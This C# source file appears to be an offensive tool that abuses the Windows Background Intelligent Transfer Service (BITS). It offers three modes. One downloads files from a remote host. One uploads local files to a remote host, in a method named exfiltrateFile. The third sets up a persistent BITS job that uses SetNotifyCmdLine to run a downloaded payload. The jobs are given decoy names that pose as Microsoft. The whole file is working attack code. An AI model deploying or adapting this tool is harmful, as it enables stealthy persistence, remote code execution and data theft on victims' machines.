using System;
using System.IO;
using BITS = BITSReference1_5; // reference library used


namespace shepard
{
    class JobObj
    {
        static BITS.BackgroundCopyManager1_5 mgr;
        static BITS.GUID jobGuid;
        static BITS.IBackgroundCopyJob job;
        static JobObj jo;

        public JobObj()
        {
            mgr = new BITS.BackgroundCopyManager1_5(); // instantiate BITS Manager Object
        }

        //Usage params: url or ip:port, full path
        private void downloadFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob(); // normal BITS function

        }

        //Usage params: url or ip:port, full path
        private void exfiltrateFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob(); // normal BITS function
        }

        //Default execution of a BITS Job, fully completes
        private void executeBITSJob()
        {
            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                        System.Threading.Thread.Sleep(500); // delay a little bit
                        break;
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;

                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;

                    default:
                        System.Threading.Thread.Sleep(500); // delay a little bit
                        break;
                }
            }
        }

        //Usage: BITS job name, file path, "file args"
        private void persist(string remote, string filePath, string cmdArgs)
        {
            string name = "Microsoft Example BD_1";
            jo.downloadFile(name, remote, filePath); //initial download, completes

            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);

            job.AddFile(remote, filePath);
            jo.commandExec(job, filePath, cmdArgs);
            job.SetMinimumRetryDelay(30);

            job.Resume(); // this downloads the file and keeps it in a persistent running state
            //System.Threading.Thread.Sleep(1000);
            //job.Suspend();
        }

        private void commandExec(BITS.IBackgroundCopyJob job, string filename, string args)
        {
            var job2 = job as BITS.IBackgroundCopyJob2; // cast to CopyJob2 so cmd execution can occur
            job2.SetNotifyCmdLine(filename, args);
        }

        public static void Main(string[] args)
        {
            
            if (args.Length == 0) { return; } // close out the program if no arguments given

            jo = new JobObj();

            string switchCase = args[0];

            switch (switchCase)
            {
                case "-d":
                    if (args.Length == 3)
                    {
                        jo.downloadFile("Microsoft Example QD_1", args[1], args[2]); // download file using BITS
                        break;
                    }
                    return;
                case "-e":
                    if (args.Length == 3)
                    {
                        jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]); // upload file using BITS
                        break;
                    }
                    return;
                case "-dr": 
                    if (args.Length == 4) // program has command line args
                    {
                        jo.persist(args[1], args[2], args[3]); // download file and peristently run
                        break;
                    }
                    else if (args.Length == 3) // program should just be run like normal
                    {
                        jo.persist(args[1], args[2], ""); // download file and peristently run
                        break;
                    }
                    return;
                default:
                    return; // close out the program
            }

        }

    }
}
